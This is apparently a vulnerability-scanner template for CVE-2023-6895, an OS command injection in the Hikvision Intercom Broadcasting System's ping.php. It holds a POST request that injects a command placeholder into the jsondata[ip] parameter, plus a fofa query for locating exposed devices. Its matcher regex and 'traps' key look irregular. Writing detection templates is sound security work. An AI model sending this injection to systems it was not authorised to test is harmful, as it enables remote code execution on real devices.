id: CVE-2023-6895
info:
  name: Hikvision IP ping.php - Command Execution
  author: DhiyaneshDk,archer
  description: 'A vulnerability was found in Hikvision Intercom Broadcasting System
    3.0.3_20201113_RELEASE(HIK). It has been declared as critical. This vulnerability
    affects unknown code of the file /php/ping.php. The manipulation of the argument
    jsondata[ip] with the input netstat -ano leads to os command injection. The exploit
    has been disclosed to the public and may be used. Upgrading to version 4.1.0 is
    able to address this issue. It is recommended to upgrade the affected component.
    VDB-248254 is the identifier assigned to this vulnerability.

    '
  severity: critical
  reference:
  - https://vuldb.com/?ctiid.248254
  - https://vuldb.com/?id.248254
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-6895
    cwe-id: CWE-78
    epss-score: 0.0008
    epss-percentile: 0.33389
    cpe: cpe:2.3:o:hikvision:intercom_broadcast_system:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: hikvision
    product: intercom_broadcast_system
    fofa-query: icon_hash="-1830859634"
  tags: cve,cve2023,hikvision,rce
traps:
- request:
    method: POST
    path: /php/ping.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: jsondata%5Btype%5D=99&jsondata%5Bip%5D={{command}}
  response:
    status_code: 200
    headers: {}
    body: Windows IP((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)
